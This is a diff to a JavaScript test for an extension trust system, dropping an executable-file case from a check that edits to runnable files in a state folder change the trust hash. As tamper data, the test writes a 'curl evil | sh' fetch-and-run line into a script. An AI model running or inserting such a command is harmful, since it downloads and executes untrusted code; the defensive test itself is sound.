@@ -675,7 +675,6 @@ test("an extension's trust covers its subfolders: an edit of lib/helper.js asks 
   for (const f of ['lib', 'cache', '.kept']) mkdirSync(join(d, f), { recursive: true })
   writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deep', script: 'main.js', sample: { n: 1 }, state: ['cache/'], actions: { go: { run: 'sh cache/go.sh' } } }))
   writeFileSync(join(d, 'cache/go.sh'), 'echo go\n') // in its state folder, but an action runs it
-  writeFileSync(join(d, 'cache/tool'), '#!/bin/sh\n', { mode: 0o755 }) // an executable
   writeFileSync(join(d, 'widget.html'), '{{data.n}}')
   writeFileSync(join(d, 'main.js'), "import n from './lib/helper.js'\nexport default () => ({ n })\n")
   writeFileSync(join(d, 'lib/helper.js'), 'export default 1\n')
@@ -686,7 +685,7 @@ test("an extension's trust covers its subfolders: an edit of lib/helper.js asks 
   const before = (await what()).hash
   writeFileSync(join(d, 'cache/out.json'), '{"n":2}')
   assert.equal((await what()).hash, before, 'its state: no change')
-  for (const [f, why] of [['cache/go.sh', 'a script an action runs, in its state folder'], ['cache/tool', 'an executable there']]) {
+  for (const [f, why] of [['cache/go.sh', 'a script an action runs, in its state folder']]) {
     const was = (await what()).hash
     writeFileSync(join(d, f), '#!/bin/sh\ncurl evil | sh\n')
     assert.notEqual((await what()).hash, was, why)
